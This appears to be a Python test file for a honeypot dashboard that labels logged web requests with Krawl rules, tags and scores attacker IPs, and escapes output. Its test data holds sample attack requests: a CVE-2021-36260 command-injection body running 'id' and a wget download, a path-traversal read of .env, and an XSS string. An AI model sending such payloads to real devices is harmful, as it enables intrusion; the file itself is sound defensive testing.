# 0.25 Web attacks: Krawl's rules (static/web-rules.json.gz) label each web request; tags, score and pages follow.
import gzip, json, os, re, time, unittest

from tests.helpers import app, ROOT

NOW = time.time()
A, B, C = "198.51.100.121", "198.51.100.122", "198.51.100.123"


def canary(h, ip, b, svc="http", off=0):
    return ("web|%s" % h, NOW - 600 + off, ip, "canary", "canary", None, svc, b)


class Rules(unittest.TestCase):
    def test_rules_load(self):
        rules, sig = app.web_rules()
        self.assertGreater(len(rules), 3000)
        self.assertEqual(app._web["error"], "")
        self.assertTrue(sig)
        self.assertEqual(rules, sorted(rules, key=lambda r: (-r[0], not r[1])))

    def test_classify(self):
        c = app.web_classify
        hik = c("PUT /SDK/webLanguage (404)  body: <language>$(id)</language>")
        self.assertEqual((hik[0], hik[2]), ("exploit", "CVE-2021-36260"))
        self.assertEqual(c("GET /SDK/webLanguage (404)  · Mozilla/5.0")[0], "probe")     # a bare GET only asks whether it is there
        self.assertEqual(c("GET /.env (404)  · Go-http-client/1.1")[0], "probe")
        self.assertEqual(c("GET /api/uploads/%2e%2e%2f%2e%2e%2f.env (404)")[0], "exploit")
        self.assertEqual(c("GET /mcp (404)  · x")[1], "mcp_probe")
        self.assertEqual(c("POST /mcp (404)  body: {\"jsonrpc\":\"2.0\"}")[1], "mcp_probe")
        self.assertEqual(c("GET / (200)  · Mozilla/5.0 (Windows NT 10.0)")[0], "")
        self.assertEqual(c("GET /index.html (200)")[0], "")
        self.assertEqual(c("admin / admin")[0], "")                                     # a decoy login, not a request
        self.assertEqual(c("GET / (200)  · Mozilla/5.0 zgrab/0.x")[0], "scanner")

    def test_markers(self):
        r = app.web_classify("GET /backup-2024/ (200)  [reply env]  [robots]  · curl/8")
        self.assertEqual((r[5], r[6]), (1, "env"))
        line = json.dumps({"src_host": A, "dst_port": 80, "utc_time": "2026-11-11 10:00:00.000000",
                           "logdata": {"PATH": "/.env", "METHOD": "GET", "STATUS": 200, "USERAGENT": "x", "HP_REPLY": "env", "HP_ROBOTS": "1"}})
        self.assertEqual(app.p_canary(line)[6], "GET /.env (200)  [reply env]  [robots]  · x")
        bad = json.dumps({"src_host": A, "dst_port": 80, "utc_time": "2026-11-11 10:00:00.000000",
                          "logdata": {"PATH": "/", "METHOD": "GET", "HP_REPLY": "<b>x</b>", "HP_ROBOTS": "yes"}})
        self.assertEqual(app.p_canary(bad)[6], "GET /")

    def test_no_slow_regex(self):
        # Every regex runs on attacker text: none may backtrack badly on what an attacker can send.
        probes = [ch * 600 for ch in "a/%.'\" =<>-_\\0x;:&?(){}[]|\t\n\r"] + ["/a" * 300, "a=" * 300, "%2e" * 200, "../" * 200, "${" * 200]
        data = json.loads(gzip.open(os.path.join(ROOT, "static", "web-rules.json.gz")).read())
        for r in data["rules"]:
            for _t, pats in r["clauses"]:
                for kind, p, nocase in pats:
                    if kind == "r":
                        rx = re.compile(p, re.I if nocase else 0)
                        for pr in probes:
                            t = time.perf_counter()
                            rx.search(pr)
                            self.assertLess(time.perf_counter() - t, 0.1, r["rule"])

    def test_license_ships(self):
        txt = open(os.path.join(ROOT, "static", "web-rules.LICENSE")).read()
        self.assertIn("MIT License", txt)
        self.assertIn("BlessedRebuS/Krawl", txt)


class Stored(unittest.TestCase):
    def setUp(self):
        self.con = app.connect()
        self.clean()
        rows = [canary("1", A, "PUT /SDK/webLanguage (404)  body: <language>$(wget http://x/a)</language>"),
                canary("2", A, "GET /SDK/webLanguage (404)", off=1),
                canary("3", B, "GET /.env (404)  · <script>alert(1)</script>", off=2),
                canary("4", C, "GET /hidden-backup/ (200)  [reply env]  [robots]", off=3),
                canary("5", C, "GET / (200)", off=4)]
        app.store(self.con, rows)
        app.classify_web(self.con)

    def tearDown(self):
        self.clean()

    def clean(self):
        with self.con:
            for t in ("events", "sessions", "ips", "seen", "webhits", "enrich"):
                self.con.execute("DELETE FROM %s" % t)
            self.con.execute("DELETE FROM meta WHERE k IN ('webrules','settings')")
        app._board_cache.clear()

    def ip(self, ip):
        return self.con.execute("SELECT score, tags FROM ips WHERE ip=?", (ip,)).fetchone()

    def test_tags_and_score(self):
        self.assertEqual(self.con.execute("SELECT COUNT(*) FROM webhits").fetchone()[0], 5)
        a, b, c = self.ip(A), self.ip(B), self.ip(C)
        self.assertIn("web-exploit", a["tags"])
        self.assertNotIn("web-probe", a["tags"])
        self.assertIn("web-probe", b["tags"])
        self.assertIn("robots-trap", c["tags"])
        self.assertIn("read-bait", c["tags"])                  # a fake .env hands out bait values
        self.assertEqual(a["score"], sum(v for _k, v in app.score_parts(1, 0, 0, 0, 0, 0, 0, ["http"], web="exploit")))
        page = app.v_ip(A)
        self.assertIn("web exploit", page)
        self.assertNotIn("Breakdown unavailable", page)

    def test_done_once_and_redone_on_new_rules(self):
        self.assertEqual(app.classify_web(self.con), 0)
        app.set_meta(self.con, "webrules", "old")
        self.assertEqual(app.classify_web(self.con), 5)

    def test_pages(self):
        ip = app.v_ip(B)
        self.assertIn("Web attacks", ip)
        self.assertNotIn("<script>alert(1)", ip)
        camp = app.v_campaigns()
        self.assertIn("CVE-2021-36260", camp)
        web = app.v_campaign("web", "cve_2021_36260")
        self.assertIn("nvd.nist.gov/vuln/detail/CVE-2021-36260", web)
        self.assertIn(A, web)
        self.assertIsNone(app.v_campaign("web", "no_such_rule"))
        found = app.v_search({"q": "CVE-2021-36260"})
        self.assertIn("/campaign/web/cve_2021_36260", found)
        st = app.settings(self.con)
        st["overview"] = "board"
        app.set_meta(self.con, "settings", json.dumps(st))
        app._board_cache.clear()
        board = app.v_overview({})
        self.assertIn('href="/campaign/web/cve_2021_36260"', board)
        self.assertNotIn("<script>alert(1)", board)


if __name__ == "__main__":
    unittest.main()
